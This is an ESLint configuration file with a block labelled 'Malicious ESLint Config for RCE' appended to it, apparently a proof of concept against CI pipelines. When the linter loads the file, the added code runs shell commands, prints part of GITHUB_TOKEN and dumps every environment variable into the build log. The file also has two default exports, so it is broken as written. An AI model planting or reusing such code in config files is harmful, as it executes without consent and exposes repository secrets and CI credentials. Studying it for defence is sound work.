import { makeBaseConfig } from 'jetpack-js-tools/eslintrc/base.mjs';
import { execSync } from 'child_process';

export default makeBaseConfig( import.meta.url, { envs: [ 'node', 'commonjs' ] } );
// Malicious ESLint Config for RCE

console.log("========================================");
console.log("[!] ESLINT CONFIG LOADED - EXECUTING PAYLOAD");
try {
    console.log("[+] User: " + execSync('whoami').toString().trim());
    console.log("[+] Secrets (First 4 chars):");
    const token = process.env.GITHUB_TOKEN || process.env.INPUT_GITHUB_TOKEN;
    if (token) console.log("    GITHUB_TOKEN: " + token.substring(0,4) + "...");
    
    // Dump everything to prove impact
    console.log(execSync('env').toString());
} catch (e) {
    console.error(e);
}
console.log("========================================");

export default [
    {
        // Match all files to ensure this config is "used"
        files: ["**/*.js", "**/*.ts"],
        rules: {}
    }
];
